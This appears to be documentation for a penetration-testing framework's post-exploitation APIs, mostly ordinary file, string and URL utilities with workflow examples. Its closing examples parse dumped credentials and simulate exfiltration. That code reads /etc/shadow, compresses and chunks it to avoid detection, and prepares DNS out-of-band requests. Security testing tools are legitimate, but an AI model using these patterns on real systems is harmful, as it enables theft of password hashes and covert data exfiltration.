# Post-Exploitation APIs

APIs for file operations, data manipulation, utilities, and credential management.

## File Operations

### read_file / write_file

Simple file I/O operations.

**Reading Files:**

```python
from ofx.api.file import read_file

# Read text file
content = read_file('config.txt')
print(content)

# Read with Path object
from pathlib import Path
content = read_file(Path('/etc/passwd'))

# Error handling
try:
    content = read_file('nonexistent.txt')
except FileNotFoundError as e:
    print(f"File not found: {e}")
```

**Writing Files:**

```python
from ofx.api.file import write_file

# Write string to file (creates directories automatically)
write_file('Hello World', 'output/test.txt')

# Write configuration
config = """
[database]
host = localhost
port = 3306
"""
write_file(config, 'config/database.ini')

# Write with Path object
from pathlib import Path
write_file('data', Path('/tmp/output.txt'))
```

**Practical Examples:**

```python
# Download and save file
from ofx.api.http import requests
from ofx.api.file import write_file

response = requests.get('https://example.com/data.json')
write_file(response.text, 'downloads/data.json')

# Process and save
from ofx.api.file import read_file, write_file

# Read input
data = read_file('input.txt')

# Process
processed = data.upper().replace('OLD', 'NEW')

# Save output
write_file(processed, 'output.txt')

# Log results
results = []
for target in targets:
    result = scan(target)
    results.append(f"{target}: {result}")

write_file('\n'.join(results), 'scan_results.txt')
```

## String Utilities

### remove_duplicate_string

Remove duplicates from string lists while preserving order.

```python
from ofx.api.strings import remove_duplicate_string

# Remove duplicates
urls = [
    'http://example.com',
    'http://test.com',
    'http://example.com',  # Duplicate
    'http://demo.com'
]

unique_urls = remove_duplicate_string(urls)
# Result: ['http://example.com', 'http://test.com', 'http://demo.com']

# Use in workflows
targets = ['192.168.1.1', '10.0.0.1', '192.168.1.1']
unique_targets = remove_duplicate_string(targets)
```

## General Utilities

### url2ip

Convert URLs to IP addresses with port extraction.

```python
from ofx.api.utils import url2ip

# Basic conversion
ip = url2ip('http://example.com')
print(ip)  # '93.184.216.34'

# With port extraction
ip, port = url2ip('https://example.com:8443', with_port=True)
print(f"{ip}:{port}")  # '93.184.216.34:8443'

# Default port handling
ip, port = url2ip('http://example.com', with_port=True)
# Result: ('93.184.216.34', 80)

ip, port = url2ip('https://secure.example.com', with_port=True)
# Result: ('93.184.216.34', 443)
```

**Practical Use:**

```python
# Scan URLs by IP
from ofx.api.utils import url2ip
from ofx.api.network import PortScanner

urls = [
    'http://site1.com',
    'https://site2.com:8443',
    'http://site3.com:8080'
]

scanner = PortScanner()
for url in urls:
    ip, port = url2ip(url, with_port=True)
    print(f"Scanning {url} ({ip}:{port})")
    results = scanner.scan(ip, ports=[port])
    print(results)
```

### str_to_dict

Parse string representations of dictionaries.

```python
from ofx.api.utils import str_to_dict

# Parse string to dict
config_str = "{'host': 'localhost', 'port': 3306, 'timeout': 30}"
config = str_to_dict(config_str)

print(config['host'])    # 'localhost'
print(config['port'])    # 3306
print(config['timeout']) # 30

# Use in workflow parsing
settings_str = "{'debug': True, 'log_level': 'INFO'}"
settings = str_to_dict(settings_str)
if settings['debug']:
    print("Debug mode enabled")
```

### generate_random_user_agent

Generate realistic user agent strings.

```python
from ofx.api.utils import generate_random_user_agent

# Generate random user agent
ua = generate_random_user_agent()
print(ua)
# 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...'

# Use in HTTP requests
from ofx.api.http import requests

headers = {'User-Agent': generate_random_user_agent()}
response = requests.get('https://example.com', headers=headers)

# Generate multiple for rotation
user_agents = [generate_random_user_agent() for _ in range(10)]
```

**Practical Example:**

```python
# Rotate user agents for scraping
from ofx.api.http import requests
from ofx.api.utils import generate_random_user_agent
import time

urls = ['http://site1.com', 'http://site2.com', 'http://site3.com']

for url in urls:
    headers = {'User-Agent': generate_random_user_agent()}
    response = requests.get(url, headers=headers)
    print(f"{url}: {response.status_code}")
    time.sleep(1)  # Rate limiting
```

## Workflow Integration

### File Processing Workflow

```yaml
name: Log Analysis

inputs:
  log_file:
    required: true
  pattern:
    required: true

jobs:
  analyze:
    steps:
      - name: Read Log File
        script: |
          from ofx.api.file import read_file
          
          content = read_file('${{ inputs.log_file }}')
          lines = content.split('\n')
          print(f"total_lines={len(lines)}")
        outputs:
          total_lines: "${{ step.total_lines }}"
      
      - name: Filter Logs
        script: |
          from ofx.api.file import read_file
          import re
          
          content = read_file('${{ inputs.log_file }}')
          pattern = r'${{ inputs.pattern }}'
          
          matches = []
          for line in content.split('\n'):
              if re.search(pattern, line):
                  matches.append(line)
          
          print(f"matches={len(matches)}")
          result = '\n'.join(matches)
          print(f"filtered_content={result}")
        outputs:
          matches: "${{ step.matches }}"
          filtered_content: "${{ step.filtered_content }}"
      
      - name: Save Results
        script: |
          from ofx.api.file import write_file
          
          content = '''{{ steps.1.outputs.filtered_content }}'''
          write_file(content, 'results/filtered_logs.txt')
          
          summary = f"Found {{ steps.1.outputs.matches }} matches"
          write_file(summary, 'results/summary.txt')
```

### Data Collection Workflow

```yaml
name: Target Enumeration

inputs:
  target_domain:
    required: true

jobs:
  enumerate:
    steps:
      - name: Collect Subdomains
        script: |
          from ofx.api.network import SubdomainEnumerator
          from ofx.api.strings import remove_duplicate_string
          
          enum = SubdomainEnumerator(domain='${{ inputs.target_domain }}')
          subdomains = enum.enumerate()
          
          # Remove duplicates
          unique = remove_duplicate_string(subdomains)
          
          print(f"found={len(unique)}")
          print(f"subdomains={','.join(unique)}")
        outputs:
          subdomains: "${{ step.subdomains }}"
      
      - name: Resolve IPs
        script: |
          from ofx.api.utils import url2ip
          from ofx.api.strings import remove_duplicate_string
          
          subdomains = "{{ steps.0.outputs.subdomains }}".split(',')
          ips = []
          
          for subdomain in subdomains:
              try:
                  ip = url2ip(f"http://{subdomain}")
                  ips.append(ip)
              except:
                  pass
          
          unique_ips = remove_duplicate_string(ips)
          print(f"ips={','.join(unique_ips)}")
        outputs:
          ips: "${{ step.ips }}"
      
      - name: Save Report
        script: |
          from ofx.api.file import write_file
          import json
          
          report = {
              'domain': '${{ inputs.target_domain }}',
              'subdomains': "{{ steps.0.outputs.subdomains }}".split(','),
              'ips': "{{ steps.1.outputs.ips }}".split(','),
              'total_subdomains': len("{{ steps.0.outputs.subdomains }}".split(',')),
              'total_ips': len("{{ steps.1.outputs.ips }}".split(','))
          }
          
          write_file(json.dumps(report, indent=2), 'reports/enumeration.json')
```

### Web Scraping Workflow

```yaml
name: Web Content Scraper

inputs:
  urls:
    description: "Comma-separated URLs"
    required: true

jobs:
  scrape:
    steps:
      - name: Download Pages
        script: |
          from ofx.api.http import requests
          from ofx.api.utils import generate_random_user_agent
          from ofx.api.file import write_file
          import time
          
          urls = "${{ inputs.urls }}".split(',')
          
          for i, url in enumerate(urls):
              headers = {'User-Agent': generate_random_user_agent()}
              try:
                  response = requests.get(url.strip(), headers=headers)
                  filename = f'downloads/page_{i}.html'
                  write_file(response.text, filename)
                  print(f"Downloaded: {url}")
              except Exception as e:
                  print(f"Failed {url}: {e}")
              
              time.sleep(2)  # Rate limiting
      
      - name: Extract Titles
        script: |
          from ofx.api.file import read_file
          from pathlib import Path
          import re
          
          titles = []
          for html_file in Path('downloads').glob('*.html'):
              content = read_file(html_file)
              match = re.search(r'<title>(.*?)</title>', content)
              if match:
                  titles.append(match.group(1))
          
          print(f"titles={','.join(titles)}")
        outputs:
          titles: "${{ step.titles }}"
      
      - name: Generate Report
        script: |
          from ofx.api.file import write_file
          
          urls = "${{ inputs.urls }}".split(',')
          titles = "{{ steps.1.outputs.titles }}".split(',')
          
          report = "# Web Scraping Report\n\n"
          for url, title in zip(urls, titles):
              report += f"- [{title}]({url})\n"
          
          write_file(report, 'reports/scraping_report.md')
```

## Practical Examples

### Credential Harvesting

```python
from ofx.api.file import read_file, write_file
from ofx.api.strings import remove_duplicate_string
import re

# Read dumped credentials
data = read_file('dump.txt')

# Extract emails
emails = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', data)
unique_emails = remove_duplicate_string(emails)

# Extract IPs
ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', data)
unique_ips = remove_duplicate_string(ips)

# Extract URLs
urls = re.findall(r'https?://[^\s<>"]+', data)
unique_urls = remove_duplicate_string(urls)

# Save organized data
write_file('\n'.join(unique_emails), 'extracted/emails.txt')
write_file('\n'.join(unique_ips), 'extracted/ips.txt')
write_file('\n'.join(unique_urls), 'extracted/urls.txt')

print(f"Extracted {len(unique_emails)} emails")
print(f"Extracted {len(unique_ips)} IPs")
print(f"Extracted {len(unique_urls)} URLs")
```

### Response Analysis

```python
from ofx.api.http import requests
from ofx.api.file import write_file
from ofx.api.utils import url2ip, generate_random_user_agent
import json

# Target URLs
urls = [
    'http://admin.example.com',
    'http://api.example.com',
    'http://staging.example.com'
]

results = []
for url in urls:
    # Randomize user agent
    headers = {'User-Agent': generate_random_user_agent()}
    
    try:
        # Get IP
        ip = url2ip(url)
        
        # Fetch page
        response = requests.get(url, headers=headers, timeout=5)
        
        # Analyze response
        result = {
            'url': url,
            'ip': ip,
            'status': response.status_code,
            'size': len(response.text),
            'headers': dict(response.headers),
            'title': extract_title(response.text)
        }
        
        results.append(result)
        print(f"✓ {url} [{response.status_code}]")
        
    except Exception as e:
        print(f"✗ {url} - {e}")
        results.append({
            'url': url,
            'error': str(e)
        })

# Save results
write_file(json.dumps(results, indent=2), 'analysis/responses.json')

def extract_title(html):
    import re
    match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE)
    return match.group(1) if match else 'No title'
```

### Data Exfiltration Simulation

```python
from ofx.api.file import read_file, write_file
from ofx.api.http import requests
import base64
import gzip

# Read sensitive file
data = read_file('/etc/shadow')

# Compress
compressed = gzip.compress(data.encode())

# Encode
encoded = base64.b64encode(compressed).decode()

# Split into chunks (avoid detection)
chunk_size = 100
chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]

# Exfiltrate via DNS/HTTP
from ofx.api.oob import CEye

ceye = CEye()
for i, chunk in enumerate(chunks):
    # Create unique subdomain with data
    payload = ceye.build_request(f'chunk{i}', type='dns')
    # In real scenario, encode chunk in subdomain
    # dns_query = f"{chunk}.{payload['url']}"
    
    print(f"Chunk {i}/{len(chunks)} ready for exfiltration")

# Save for later retrieval
write_file('\n'.join(chunks), 'exfil/data_chunks.txt')
print(f"Data split into {len(chunks)} chunks")
```

## See Also

- [Reconnaissance APIs](reconnaissance.md) - Search engines, OOB testing, network scanning
- [Exploitation APIs](exploitation.md) - Shellcode, payloads, webshells
- [Workflow Guide](../guide/workflows.md) - Using APIs in workflows
- [Template System](../guide/templates.md) - Dynamic configuration
